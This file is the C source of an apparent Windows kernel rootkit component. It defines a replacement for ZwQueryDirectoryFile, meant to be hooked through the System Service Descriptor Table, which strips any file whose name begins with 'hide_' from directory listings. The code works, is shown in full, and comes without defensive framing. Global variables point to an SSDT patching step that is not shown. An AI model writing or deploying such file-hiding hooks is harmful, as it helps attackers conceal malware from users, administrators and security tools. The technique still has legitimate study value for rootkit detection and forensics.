#include <ntifs.h>
#include <ntddk.h>

typedef int BOOL;
typedef NTSTATUS(*ZwQueryDirectoryFilePtr)(HANDLE, HANDLE, PIO_APC_ROUTINE, PVOID, PIO_STATUS_BLOCK, PVOID, ULONG, FILE_INFORMATION_CLASS, BOOLEAN, PUNICODE_STRING, BOOLEAN);

typedef struct SystemServiceDescriptorTable {
	PULONG ServiceTableBase;
	PULONG ServiceCounterTableBase;
	ULONG NumberOfServices;
	ULONG ParamTableBase;
} SSDT, * PSSDT;

PWCHAR getDirEntryFileName(PVOID FileInformation, FILE_INFORMATION_CLASS FileInfomationClass);
BOOL isHidden(PWCHAR fileName);
ULONG getNextEntryOffset(PVOID FileInformation, FILE_INFORMATION_CLASS FileInfomationClass);
void setNextEntryOffset(PVOID FileInformation, FILE_INFORMATION_CLASS FileInfomationClass, ULONG newValue);

ULONG originalZwQueryDirectoryFileAddress;
ULONG ssdtZwQueryDirectoryFileAddress;
PSSDT KeServiceDescriptorTable;
ZwQueryDirectoryFilePtr fnZwQueryDirectoryFile;

NTSTATUS Hook_ZwQueryDirectoryFile(
	HANDLE FileHandle,
	HANDLE Event,
	PIO_APC_ROUTINE ApcRoutine,
	PVOID ApcContext,
	PIO_STATUS_BLOCK IoStatusBlock,
	PVOID FileInformation,
	ULONG Length,
	FILE_INFORMATION_CLASS FileInformationClass,
	BOOLEAN ReturnSingleEntry,
	PUNICODE_STRING FileName,
	BOOLEAN RestartScan
) {

	PVOID currentFile, previousFile;
	NTSTATUS ntStatus = fnZwQueryDirectoryFile(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation, Length, FileInformationClass, ReturnSingleEntry, FileName, RestartScan);

	if (!NT_SUCCESS(ntStatus)) {
		return ntStatus;
	}

	if (FileInformationClass == FileDirectoryInformation ||
		FileInformationClass == FileFullDirectoryInformation ||
		FileInformationClass == FileIdFullDirectoryInformation ||
		FileInformationClass == FileBothDirectoryInformation ||
		FileInformationClass == FileIdBothDirectoryInformation ||
		FileInformationClass == FileNamesInformation
		) {

		currentFile = FileInformation;
		previousFile = NULL;

		do {
			if (isHidden(getDirEntryFileName(currentFile, FileInformationClass)) == TRUE) {

				if (getNextEntryOffset(currentFile, FileInformationClass) != 0) {
					ULONG delta;
					ULONG nBytes;
					// We get number of bytes between the 2 addresses (that we already processed)
					delta = (ULONG)currentFile - (ULONG)FileInformation;
					// Lenght is size of FileInformation buffer
					// We get the number of bytes still to be sweeped trought
					nBytes = Length - delta;
					// We get the size of bytes to be processed if we remove the current entry.
					nBytes = nBytes - getNextEntryOffset(currentFile, FileInformationClass);
					// The next operation replaces the rest of the array by the same array without the current structure.
					RtlCopyMemory(currentFile, ((PCHAR)currentFile + getNextEntryOffset(currentFile, FileInformationClass)), nBytes);
					continue;
				}
				else {
					// Only one file
					if (currentFile == FileInformation) {
						ntStatus = STATUS_NO_MORE_FILES;
					}
					else {
						// Several file and ours is the last one
						// We set previous to end of file
						setNextEntryOffset(previousFile, FileInformationClass, 0);
					}
					// Exit while loop
					break;

				}

			}
			previousFile = currentFile;
			// Set current file to next file in array
			currentFile = ((PCHAR)currentFile + getNextEntryOffset(currentFile, FileInformationClass));

		} while (getNextEntryOffset(previousFile, FileInformationClass) != 0);

	}
	return ntStatus;
}


PWCHAR getDirEntryFileName(PVOID FileInformation, FILE_INFORMATION_CLASS FileInfomationClass) {
	PWCHAR fileName = NULL;
	ULONG fileNameLength = 0;

	switch (FileInfomationClass) {
		case FileDirectoryInformation:
			fileName = ((PFILE_DIRECTORY_INFORMATION)FileInformation)->FileName;
			fileNameLength = ((PFILE_DIRECTORY_INFORMATION)FileInformation)->FileNameLength;
			break;
		case FileFullDirectoryInformation:
			fileName = ((PFILE_FULL_DIR_INFORMATION)FileInformation)->FileName;
			fileNameLength = ((PFILE_FULL_DIR_INFORMATION)FileInformation)->FileNameLength;
			break;
		case FileIdFullDirectoryInformation:
			fileName = ((PFILE_ID_FULL_DIR_INFORMATION)FileInformation)->FileName;
			fileNameLength = ((PFILE_ID_FULL_DIR_INFORMATION)FileInformation)->FileNameLength;
			break;
		case FileBothDirectoryInformation:
			fileName = ((PFILE_BOTH_DIR_INFORMATION)FileInformation)->FileName;
			fileNameLength = ((PFILE_BOTH_DIR_INFORMATION)FileInformation)->FileNameLength;
			break;
		case FileIdBothDirectoryInformation:
			fileName = ((PFILE_ID_BOTH_DIR_INFORMATION)FileInformation)->FileName;
			fileNameLength = ((PFILE_ID_BOTH_DIR_INFORMATION)FileInformation)->FileNameLength;
			break;
		case FileNamesInformation:
			fileName = ((PFILE_NAMES_INFORMATION)FileInformation)->FileName;
			fileNameLength = ((PFILE_NAMES_INFORMATION)FileInformation)->FileNameLength;
			break;
		default: break;
	}

	if (fileName != NULL) {
		for (int i = fileNameLength - 1; i > 0; i--) {
			if (fileName[i] == L'\\') {
				fileName = fileName + i + 1;
				break;
			}
		}
	}
	return fileName;
}

BOOL isHidden(PWCHAR fileName) {
	UNICODE_STRING prefix, usFileName;

	RtlInitUnicodeString(&prefix, L"hide_");
	RtlInitUnicodeStringEx(&usFileName, fileName);

	DbgPrint("File Name in isHidden %ls\n", fileName);

	return RtlPrefixUnicodeString(&prefix, &usFileName, FALSE);
}

ULONG getNextEntryOffset(PVOID FileInformation, FILE_INFORMATION_CLASS FileInformationClass) {
	switch (FileInformationClass) {
		case FileDirectoryInformation:
			return ((PFILE_DIRECTORY_INFORMATION)FileInformation)->NextEntryOffset;
		case FileFullDirectoryInformation:
			return ((PFILE_FULL_DIR_INFORMATION)FileInformation)->NextEntryOffset;
		case FileIdFullDirectoryInformation:
			return ((PFILE_ID_FULL_DIR_INFORMATION)FileInformation)->NextEntryOffset;
		case FileBothDirectoryInformation:
			return ((PFILE_BOTH_DIR_INFORMATION)FileInformation)->NextEntryOffset;
		case FileIdBothDirectoryInformation:
			return ((PFILE_ID_BOTH_DIR_INFORMATION)FileInformation)->NextEntryOffset;
		case FileNamesInformation:
			return ((PFILE_NAMES_INFORMATION)FileInformation)->NextEntryOffset;
	}
	return 0;
}

void setNextEntryOffset(PVOID FileInformation, FILE_INFORMATION_CLASS FileInformationClass, ULONG newValue) {
	switch (FileInformationClass) {
		case FileDirectoryInformation:
			((PFILE_DIRECTORY_INFORMATION)FileInformation)->NextEntryOffset = newValue;
			break;
		case FileFullDirectoryInformation:
			((PFILE_FULL_DIR_INFORMATION)FileInformation)->NextEntryOffset = newValue;
			break;
		case FileIdFullDirectoryInformation:
			((PFILE_ID_FULL_DIR_INFORMATION)FileInformation)->NextEntryOffset = newValue;
			break;
		case FileBothDirectoryInformation:
			((PFILE_BOTH_DIR_INFORMATION)FileInformation)->NextEntryOffset = newValue;
			break;
		case FileIdBothDirectoryInformation:
			((PFILE_ID_BOTH_DIR_INFORMATION)FileInformation)->NextEntryOffset = newValue;
			break;
		case FileNamesInformation:
			((PFILE_NAMES_INFORMATION)FileInformation)->NextEntryOffset = newValue;
			break;
	}
}